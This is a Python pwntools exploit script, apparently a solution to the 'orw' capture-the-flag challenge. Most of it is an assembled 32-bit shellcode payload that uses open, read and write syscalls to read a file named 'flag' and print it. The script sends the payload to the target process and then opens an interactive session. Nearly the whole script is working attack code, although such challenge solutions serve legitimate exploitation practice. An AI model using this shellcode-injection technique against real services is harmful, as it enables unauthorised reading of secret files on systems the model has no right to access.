from pwn import *
from LibcSearcher import *
from utils import log,show_ida_patch
from loader import Loader
from pwnlib.util.proc import wait_for_debugger
from struct import pack

loader = Loader("target/orw", 32)
loader.debug()

if 1:
    @log
    def ru(x): return io.recvuntil(x)
    @log
    def rl(): return io.recvline()
    @log
    def sla(x, y): return io.sendlineafter(x, y)
    @log
    def sl(x): return io.sendline(x)
    @log
    def s(x): return io.send(x)
    @log
    def sa(x, y): return io.sendafter(x, y)
else:
    def ru(x): return io.recvuntil(x)
    def rl(): return io.recvline()
    def sla(x, y): return io.sendlineafter(x, y)
    def sl(x): return io.sendline(x)
    def s(x): return io.send(x)
    def sa(x, y): return io.sendafter(x, y)
def psize(x): return loader.psize(x)
def shell(): io.interactive()
def bt(s): return bytes(str(s),encoding='utf-8')
# io = process(loader.root,stdin=PTY)
# wait_for_debugger(io.pid)

pwnfile = [
    '/root/pwn_repos/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so',
    '--library-path',
    '/root/pwn_repos/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386',
    'target/hacknote'
]
# io = process(pwnfile)
io = loader.process()
# io = loader.remote(28823)
elf = loader.elf


def main():
    payload = asm("""
xor ecx,ecx;
xor edx,edx;
push 0x0;
push 0x67616c66;
mov ebx,esp;
mov eax,0x5;
int 0x80;

mov ebx,0x3;
mov ecx,0x0804A0F0;
mov edx,0x30;
mov eax,0x3;
int 0x80;

mov ebx,0x1;
mov ecx,0x0804A0F0;
mov edx,0x30;
mov eax,0x4;
int 0x80;
""")
    sl(payload)
    shell()


    
    
    
    
if __name__ == "__main__":
    main()